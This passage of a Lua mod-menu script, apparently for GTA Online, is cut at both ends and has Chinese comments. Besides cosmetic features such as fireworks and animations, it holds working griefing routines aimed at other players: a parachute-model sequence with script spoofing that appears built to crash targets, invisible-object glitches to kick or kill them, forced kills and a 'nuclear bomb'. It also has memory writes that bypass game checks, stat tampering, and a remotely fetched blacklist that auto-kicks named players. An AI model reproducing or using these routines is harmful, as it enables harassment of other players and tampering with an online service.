        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)

        local object_hash2 = util.joaat("prop_beach_parasol_03")
        request_model(object_hash2)
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,100, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 100, false)
        util.yield(800)
        for i = 0 , 1 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(800)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), 0xFBF7D21F)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
    util.yield()
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
    util.yield(300)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
    util.yield(1000)
    for i = 1, 10 do
        util.spoof_script("freemode", SYSTEM.WAIT)
    end
    ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
    NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)
    for i = 1, 2 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = create_vehicle(util.joaat("Ruiner2"), SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, ENTITY.GET_ENTITY_HEADING(TTPed))
        ENTITY.SET_ENTITY_INVINCIBLE(Ruiner2, true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 150, false, true, true)
        util.yield(200)
        VEHICLE1._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	1500925016)
        VEHICLE1._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(200)
        delete_entity(Ruiner2)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
    for i = 1, 2 do
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), 0xFBF7D21F)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
        util.yield()
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
        util.yield(200)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        util.yield(4500)
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)
    end
end


-----踢出室内
function Kick_room(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
    local glitch_hash = util.joaat("p_spinning_anus_s")
    local poopy_butt = util.joaat("brickade2")
    request_model(glitch_hash)
    request_model(poopy_butt)
    for i = 1, 5 do
        local stupid_object = entities.create_object(glitch_hash, pos)
        local glitch_vehicle = entities.create_vehicle(poopy_butt, pos, 0)
        ENTITY.SET_ENTITY_VISIBLE(stupid_object, false)
        ENTITY.SET_ENTITY_VISIBLE(glitch_vehicle, false)
        ENTITY.SET_ENTITY_INVINCIBLE(glitch_vehicle, true)
        ENTITY.SET_ENTITY_COLLISION(stupid_object, true, true)
        ENTITY.APPLY_FORCE_TO_ENTITY(glitch_vehicle, 1, 0.0, 10, 10, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        util.yield(500)
        delete_entity(stupid_object)
        delete_entity(glitch_vehicle)
        util.yield(500)     
    end
end

-----核弹
function nuclear_bomb_player(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local Object_pizza1 = create_vehicle(1131912276,pos.x, pos.y, pos.z,0)
    local Object_pizza2 =create_object(253279588,pos.x, pos.y, pos.z)
        pos.y = pos.y + 2
        pos.z = pos.z + 70 
        ENTITY.SET_ENTITY_ALPHA(Object_pizza1, 255)
        ENTITY.SET_ENTITY_VISIBLE(Object_pizza1, false, 0)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, pos.x, pos.y, pos.z, false, true, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(Object_pizza2,Object_pizza1, 0,  0.0, 0.00, 0.00, 1.0, 1.0,1, true, false, true, false, 0, true, 0)
    util.yield(5000)
    do
        orbital(pid)
        delete_entity(Object_pizza1)
        delete_entity(Object_pizza2)
    end
end


-----鬼畜玩家
local object_hash = util.joaat("prop_ld_ferris_wheel")
function obj_creat(index)
    object_hash = util.joaat(object_stuff.objects[index])
end
local delay = 150
function obj_creat_speed(amount)
    delay = amount
end
function Ghost_Beast_Player(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    if PLAYER.GET_PLAYER_PED(pid) ~= 0 then
        local ped = PLAYER.GET_PLAYER_PED(pid)
        local pos = players.get_position(pid)
        local glitch_hash = object_hash
        local mdl = util.joaat("rallytruck")
        request_model(glitch_hash)
        request_model(mdl)
        local obj = entities.create_object(glitch_hash, pos)
        local veh = entities.create_vehicle(mdl, pos, 0)
        ENTITY.SET_ENTITY_VISIBLE(obj, false)
        ENTITY.SET_ENTITY_VISIBLE(veh, false)
        ENTITY.SET_ENTITY_INVINCIBLE(obj, true)
        ENTITY.SET_ENTITY_COLLISION(obj, true, true)
        ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 10.0, 10.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        util.yield(delay)
        delete_entity(obj)
        delete_entity(veh)
    end
end

-----死亡屏障击杀
function Death_barrier(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local pos = players.get_position(pid)                            
    local hash = util.joaat("prop_windmill_01")
    local mdl = util.joaat("rallytruck")
    request_model(hash)
    request_model(mdl)
    for i = 0, 5 do
        if TASK.IS_PED_WALKING(ped) then
            spawn_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 1.3, 0.0)
        else
            spawn_pos = players.get_position(pid)
        end
        local obj = entities.create_object(hash, spawn_pos)
        local veh = entities.create_vehicle(mdl, spawn_pos, 0)
        ENTITY.SET_ENTITY_VISIBLE(obj, false)
        ENTITY.SET_ENTITY_VISIBLE(veh, false)
        ENTITY.SET_ENTITY_INVINCIBLE(obj, true)
        ENTITY.SET_ENTITY_COLLISION(obj, true, true)
        ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 10, 10, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        util.yield(150)
        delete_entity(obj)
        delete_entity(veh)
    end
end

-----强制击杀
function Force_kill(index, veh, pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    local vehicle = util.joaat(veh)
    request_model(vehicle)

    if veh == "Khanjali" then
        height = 2.8
        offset = 0
    elseif veh == "APC" then
        height = 3.4
        offset = -1.5
    end

    if TASK.IS_PED_STILL(ped) then
        distance = 0
    elseif not TASK.IS_PED_STILL(ped) then
        distance = 3
end
    local vehicle1 = entities.create_vehicle(vehicle, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, offset, distance, height), ENTITY.GET_ENTITY_HEADING(ped))
    local vehicle2 = entities.create_vehicle(vehicle, pos, 0)
    local vehicle3 = entities.create_vehicle(vehicle, pos, 0)
    local vehicle4 = entities.create_vehicle(vehicle, pos, 0)
    local spawned_vehs = {vehicle4, vehicle3, vehicle2, vehicle1}
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, true, false, true, false, 0, true, 0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, true, false, true, false, 0, true, 0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, true, false, true, false, 0, true, 0)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, false)
    util.yield(5000)
    for i = 1, #spawned_vehs do
        delete_entity(spawned_vehs[i])
    end
end



----大烟花
function big_fireworks()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
    local hash = util.joaat("weapon_firework")
    request_weapon_asset(hash)
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.PLAYER_PED_ID(), hash, 120, true, false)

    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-90-math.random(0, 40), pos.y-90, pos.z, pos.x-90-math.random(0, 40), pos.y-90, pos.z+20, 200, false, hash, 0, true, false, 150)
    util.yield(500)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-90-math.random(0, 40), pos.y-90, pos.z, pos.x-90-math.random(0, 40), pos.y-90, pos.z+20, 200, false, hash, 0, true, false, 150)
    util.yield(500)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-90-math.random(0, 40), pos.y-90, pos.z, pos.x-90-math.random(0, 40), pos.y-90, pos.z+20, 200, false, hash, 0, true, false, 150)
    util.yield(500)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-90-math.random(0, 40), pos.y-90, pos.z, pos.x-90-math.random(0, 40), pos.y-90, pos.z+20, 200, false, hash, 0, true, false, 150)
    util.yield(500)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-90-math.random(0, 40), pos.y-90, pos.z, pos.x-90-math.random(0, 40), pos.y-90, pos.z+20, 200, false, hash, 0, true, false, 150)
    util.yield(500)
end
--炫彩烟花
function new_firework()
    local effect = "scr_indep_fireworks"
    local effect_name = "scr_indep_firework_starburst"
    request_ptfx_asset(effect)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect)
    indep_fireworks_r = math.random(0, 255) / 255
    indep_fireworks_g = math.random(0, 255) / 255
    indep_fireworks_b = math.random(0, 255) / 255
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), math.random(-15, 15), 50+math.random(0, 10), 0)--偏移量坐标,前后,左右,上下
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(effect_name, pos.x, pos.y, pos.z, 0, 0, 0, 1.0, false, false, false, false)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(indep_fireworks_r, indep_fireworks_g, indep_fireworks_b)
    util.yield(math.random(500, 2000))
end
--礼花桶
function new_firework2()
    local effect = "scr_indep_fireworks"
    local effect_name = "scr_indep_firework_fountain"
    request_ptfx_asset(effect)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect)
    indep_fireworks_r = math.random(0, 255) / 255
    indep_fireworks_g = math.random(0, 255) / 255
    indep_fireworks_b = math.random(0, 255) / 255
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), math.random(-15, 15), 50+math.random(0, 10), 0)--偏移量坐标,前后,左右,上下
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(effect_name, pos.x, pos.y, pos.z, 0, 0, 0, 1.0, false, false, false, false)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(indep_fireworks_r, indep_fireworks_g, indep_fireworks_b)
    util.yield(math.random(500, 2000))
end


----愤怒的飞机
local numPlanes = 0
local Angry_plane_ents = {}
function Angry_plane(toggled)
    angry_plane_toggled = toggled
    while angry_plane_toggled do
        if #Angry_plane_ents < 15 then
            local pedHash = util.joaat("s_m_y_blackops_01")
            local planeModel = planes[math.random(#planes)]
            local planeHash = util.joaat(planeModel)
            request_models(planeHash, pedHash)
            local pos = players.get_position(PLAYER.PLAYER_ID())
            local plane = VEHICLE.CREATE_VEHICLE(planeHash, pos.x, pos.y, pos.z, CAM.GET_GAMEPLAY_CAM_ROT(0).z, true, false, false)
            DECORATOR.DECOR_SET_INT(plane, "Casino_Game_Info_Decorator", 1 << 3)

            NETWORK.SET_NETWORK_ID_CAN_MIGRATE(NETWORK.VEH_TO_NET(plane), false)
            local pilot = entities.create_ped(26, pedHash, pos, 0)
            PED.SET_PED_INTO_VEHICLE(pilot, plane, -1)
            pos = get_random_offset_from_entity(PLAYER.PLAYER_PED_ID(), 50.0, 150.0)
            pos.z = pos.z + 75.0
            ENTITY.SET_ENTITY_COORDS(plane, pos.x, pos.y, pos.z, false, false, false, false)
            local theta = random_float(0, 2 * math.pi)
            ENTITY.SET_ENTITY_HEADING(plane, math.deg(theta))
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(plane, 60.0)
            VEHICLE.SET_HELI_BLADES_FULL_SPEED(plane)
            VEHICLE.CONTROL_LANDING_GEAR(plane, 3)
            VEHICLE.SET_VEHICLE_FORCE_AFTERBURNER(plane, true)
            TASK.TASK_PLANE_MISSION(pilot, plane, 0, PLAYER.PLAYER_PED_ID(), 0.0, 0.0, 0.0, 6, 100.0, 0.0, 0.0, 80.0, 50.0, false)
            table.insert(Angry_plane_ents, plane);table.insert(Angry_plane_ents, pilot)
            numPlanes = numPlanes + 1
            util.yield(300)
        end
        util.yield()
    end
    for k, ent in pairs(Angry_plane_ents) do
        delete_entity(ent)
        Angry_plane_ents = {}
    end
end

-----绘制血量条
local ttselectedOpt = 1
local selfaimedPed = 0
function ped_draw_method(opt)
    ttselectedOpt = opt
end
function PedHealthBarmainLoop()
    if ttselectedOpt == 4 then
        if not PLAYER.IS_PLAYER_FREE_AIMING(PLAYER.PLAYER_ID()) then
            selfaimedPed = 0 return
        end
        local pEntity <const> = memory.alloc_int()
        if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(PLAYER.PLAYER_ID(), pEntity) then
            local entity = memory.read_int(pEntity)
            if ENTITY.IS_ENTITY_A_PED(entity) then selfaimedPed = entity end
        end
        draw_health_bar(selfaimedPed, 1000.0)
    else
        for _, ped in ipairs(get_peds_in_player_range(PLAYER.PLAYER_ID(), 500.0)) do
            if ENTITY.IS_ENTITY_ON_SCREEN(ped) or ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(PLAYER.PLAYER_PED_ID(), ped, TraceFlag.world) then
              if ttselectedOpt == 1 and PED.IS_PED_A_PLAYER(ped) then
                draw_health_bar(ped, 350.0)
              elseif ttselectedOpt == 2 and not PED.IS_PED_A_PLAYER(ped) then
                draw_health_bar(ped, 350.0)
              elseif ttselectedOpt == 3 then
                draw_health_bar(ped, 350.0)
              end
            end
        end
    end
end

------切换动作
----弹吉他
function Play_guitar(on)
    if on then
        request_anim_dict("amb@world_human_musician@guitar@male@idle_a")
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
        pguitar = create_object(util.joaat("prop_acc_guitar_01"), pos.x, pos.y, pos.z)
        TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), "amb@world_human_musician@guitar@male@idle_a", "idle_b", 3, 3, -1, 51, 0, false, false, false) --play anim 
        ENTITY.ATTACH_ENTITY_TO_ENTITY(pguitar, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 24818), -0.1,0.31,0.1,0.0,20.0,150.0, false, true, false, true, 1, true, 0)
        PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), true)
    else
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
        PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), false)
        delete_entity(pguitar)
    end
end
-----掌旋球
function Palm_spin_ball(on)
    if on then
        request_anim_dict("anim@mp_player_intincarfreakoutstd@ps@")
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
        hand_boll = create_object(util.joaat("prop_bowling_ball"), pos.x, pos.y, pos.z)
        TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), "anim@mp_player_intincarfreakoutstd@ps@", "idle_a_fp", 10, 3, -1, 51, 5, false, false, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(hand_boll, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 24818), 0.30,0.53,0,0.2,70,340, false, true, false, true, 1, true, 0)
        PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), true)
    else
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
        PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), false)
        delete_entity(hand_boll)
    end
end
-----乞求
function seek_help(on)
    if on then
        request_anim_dict("amb@world_human_bum_freeway@male@base")
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
        beggers = create_object(util.joaat("prop_beggers_sign_03"), pos.x, pos.y, pos.z)
        TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), "amb@world_human_bum_freeway@male@base", "base", 3, 3, -1, 51, 0, false, false, false) --play anim 
        ENTITY.ATTACH_ENTITY_TO_ENTITY(beggers, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 58868), 0.19,0.18,0.0,5.0,0.0,40.0, false, true, false, true, 1, true, 0)
        PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), true)
    else
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
        PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), false)
        delete_entity(beggers)
    end
end
-----献花
function offer_flower(on)
    if on then
        request_anim_dict("anim@heists@humane_labs@finale@keycards")
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
        rose = create_object(util.joaat("prop_single_rose"), pos.x, pos.y, pos.z)
        TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), "anim@heists@humane_labs@finale@keycards", "ped_a_enter_loop", 3, 3, -1, 51, 0, false, false, false) --play anim 
        ENTITY.ATTACH_ENTITY_TO_ENTITY(rose, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 18905), 0.13,0.15,0.0,-100.0,0.0,-20.0, false, true, false, true, 1, true, 0)
        PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), true)
    else
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
        PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), false)
        delete_entity(rose)
    end
end
----打伞
function hold_umbrella(on)
    if on then
        request_anim_dict("rcmnigel1d")
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
        myumbrella = create_object(util.joaat("p_amb_brolly_01"), pos.x, pos.y, pos.z)
        TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), "rcmnigel1d", "base_club_shoulder", 3, 3, -1, 51, 0, false, false, false) --play anim 
        ENTITY.ATTACH_ENTITY_TO_ENTITY(myumbrella, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.0700,0.0100,0.1100,2.3402393,-150.9605721,57.3374916, false, true, false, true, 1, true, 0)
        PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), true)
    else
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
        PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), false)
        delete_entity(myumbrella)
    end
end



-----灵魂出窍
function Out_body(toggle)
    if toggle then
        soul_clone = PED.CLONE_PED(PLAYER.PLAYER_PED_ID(),true, true, true)
        local pos = ENTITY.GET_ENTITY_COORDS(soul_clone, false)
        ENTITY.SET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), pos.x-2, pos.y, pos.z)
        ENTITY.SET_ENTITY_ALPHA(PLAYER.PLAYER_PED_ID(), 87, false)
        ENTITY.SET_ENTITY_INVINCIBLE(soul_clone,true)
        request_anim_dict("move_crawl")
        calm_ped(soul_clone, true)
    else
        local clonepedpos = ENTITY.GET_ENTITY_COORDS(soul_clone, false)
        ENTITY.SET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), clonepedpos.x,clonepedpos.y,clonepedpos.z, false, false)
        delete_entity(soul_clone)
        ENTITY.SET_ENTITY_ALPHA(PLAYER.PLAYER_PED_ID(), 255, false)
    end
end


-----附加国旗
function attach_flag(index)
    local player_cur_car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
    if player_cur_car ~= 0 then 
        local hash = util.joaat(country_flags[index])
        local pos = ENTITY.GET_ENTITY_COORDS(soul_clone, false)
        local flag = create_object(hash, pos.x, pos.y, pos.z)
        local ht = get_model_size(ENTITY.GET_ENTITY_MODEL(player_cur_car)).z
        ENTITY.ATTACH_ENTITY_TO_ENTITY(flag, player_cur_car, 0, 0, 0, ht, 0, 0, 0, true, false, false, false, 0, true, 0)
    end
end


-----homer粒子
function homer_particle()
    local player_pos = players.get_position(PLAYER.PLAYER_ID())
    request_ptfx_asset("scr_sum2_hal")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(tbl_to_random(homer_ptxf), player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
    util.yield(200)
end


---转魂枪
function Soul_Gun()
    local ent = get_entity_player_is_aiming_at(PLAYER.PLAYER_ID())
    if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
        if ENTITY.IS_ENTITY_A_PED(ent) then
            pos = ENTITY.GET_ENTITY_COORDS(ent, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, false, false, false)
            if PED.IS_PED_A_PLAYER(ent) then
                local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ent)
                copy_outfit(pid)
            else
                local soul = ENTITY.GET_ENTITY_MODEL(ent)
                change_model(PLAYER.PLAYER_ID(), soul)
                delete_entity(ent)
            end
        elseif ENTITY.IS_ENTITY_A_VEHICLE(ent) then
            local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)
            if VEHICLE.GET_VEHICLE_NUMBER_OF_PASSENGERS(ent,true,false) >= 1 then
                local soulveh = ENTITY.GET_ENTITY_MODEL(driver)
                if not PED.IS_PED_A_PLAYER(driver) then
                    delete_entity(driver)
                    change_model(PLAYER.PLAYER_ID(), soulveh)
                    PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), ent, -1)
                end
            end
        end
    end
end

-----Blacklist
--云更新Blacklist
--"http://cnsakura.top", "/api/stand/blacklist.json"
async_http.init("http://check.cnsakura.top", "/stand/blacklist.json",function(info,header,response)
    if response == 200 then
        local list = JsonToTable(info)
        local content = TableToJson(list)
        local dir = filesystem.scripts_dir() .. 'daidaiScript/blacklist.json'
        filewrite(dir, "w+", content)
    end
end);async_http.dispatch() 

--执行Blacklist
local blacklistplayers = {}
function Black_list()
    ----读取黑名单
    if #blacklistplayers < 1 then
        local path = filesystem.scripts_dir() .. 'daidaiScript/blacklist.json'
        local data = fileread(path, 'r', '*all')
        blacklistplayers = JsonToTable(data)
    end
    ----判断黑名单
    for pid = 0, 31 do
        local name = PLAYER.GET_PLAYER_NAME(pid)players.exists(pid)
        local myname = PLAYER.GET_PLAYER_NAME(PLAYER.PLAYER_ID())

        if table_find(blacklistplayers, myname) then
            MISC.QUIT_GAME()
        else
            if table_find(blacklistplayers, name) and (players.get_host() == PLAYER.PLAYER_ID()) and players.exists(pid) then
                util.toast("检测到云黑玩家: "..name.."\n已执行踢出")
                menu.trigger_commands("kick " .. name)
            end
        end
    end
end



-----在线玩家
local playerslist = {}
local player_idstab = {}
function player_list(pid)
    if NETWORK.NETWORK_IS_SESSION_ACTIVE()then
        ---防止改名增加列表
        player_idstab[pid] = NETWORK.NETWORK_GET_PLAYER_ACCOUNT_ID(pid)
        for i, rid in pairs(player_idstab) do
            local prid = NETWORK.NETWORK_GET_PLAYER_ACCOUNT_ID(pid)
            if rid == prid and playerslist[pid] ~= nil and PLAYER.GET_PLAYER_PED(pid) ~= 0 then 
                menu.delete(playerslist[pid])
                playerslist[pid] = nil
            end
        end

        playerslist[pid] = menu.list(players_list, players.get_name(pid), {}, "")
    end
    if playerslist[pid] then
        
        menu.divider(playerslist[pid],"玩家信息")
        menu.readonly(playerslist[pid], "玩家昵称: ", players.get_name(pid))
        menu.readonly(playerslist[pid], "玩家rid: ", players.get_rockstar_id(pid))
        menu.readonly(playerslist[pid], "玩家金钱: ", players.get_money(pid))
        menu.readonly(playerslist[pid], "玩家kd: ", string.format("%.2f", players.get_kd(pid)))
        menu.divider(playerslist[pid],"其他选项")
        menu.action(playerslist[pid],"踢出玩家",{},"",function()
            menu.trigger_commands("kick " .. players.get_name(pid))
        end)
        local mark = 0 --未标记
        menu.action(playerslist[pid],"标记玩家",{},"标记或者取消标记玩家\n标记后会超时玩家",function()
            if mark == 0 then
                menu.set_menu_name(playerslist[pid], players.get_name(pid).." [标记]")
                menu.trigger_commands("timeout " .. players.get_name(pid) .. " on")
                mark = 1
            else
                menu.set_menu_name(playerslist[pid], players.get_name(pid))
                menu.trigger_commands("timeout " .. players.get_name(pid) .. " off")
                mark = 0
            end
        end)

    end
end
function handle_player_list(pid)
    local ref = playerslist[pid]
    if not players.exists(pid) and ref then
        menu.delete(ref)
        playerslist[pid] = nil
        ----防止改名增加列表
        for i, rid in pairs(player_idstab) do
            local prid = NETWORK.NETWORK_GET_PLAYER_ACCOUNT_ID(pid)
            if rid == prid then 
                player_idstab[pid] = nil
            end
        end
    end
end


----恶劣玩家
function BadSportSetter(val1, val2, val3)
    STAT_SET_INT("MPPLY_BADSPORT_MESSAGE", val1)
    STAT_SET_INT("MPPLY_BECAME_BADSPORT_NUM", val1)
    STATS.STAT_SET_FLOAT(MISC.GET_HASH_KEY("MPPLY_OVERALL_BADSPORT"), val2, true)
    STAT_SET_BOOL("MPPLY_CHAR_IS_BADSPORT", val3)
end

----允许当前车辆进入车库
function carinto()
    local hash = NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(PLAYER.PLAYER_ID())
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID()) then
        local veh = PED.GET_VEHICLE_PED_IS_USING(PLAYER.PLAYER_PED_ID())
        local spawned_model = util.reverse_joaat(ENTITY.GET_ENTITY_MODEL(veh))
        memory.write_int(memory.script_global(Global_Base.in_multiplayer), 0)
        local bitset = DECORATOR.DECOR_GET_INT(veh, "MPBitset")
        bitset = CLEAR_BIT(bitset, 3)
        bitset = SET_BIT(bitset, 24)
        DECORATOR.DECOR_SET_INT(veh, "MPBitset", bitset)
        DECORATOR.DECOR_SET_INT(veh, "Previous_Owner", 0)
        DECORATOR.DECOR_SET_INT(veh, "PV_Slot", 0)
        DECORATOR.DECOR_SET_INT(veh, "Player_Vehicle", hash)
        DECORATOR.DECOR_SET_INT(veh, "Veh_Modded_By_Player", hash)
        local interior = INTERIOR.GET_INTERIOR_FROM_ENTITY(PLAYER.PLAYER_PED_ID())
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
        util.toast("完成")
        while interior == 0 do
            interior = INTERIOR.GET_INTERIOR_FROM_ENTITY(PLAYER.PLAYER_PED_ID())
            util.yield_once()
        end
        memory.write_int(memory.script_global(Global_Base.in_multiplayer), 1)
        while interior ~= 0 do
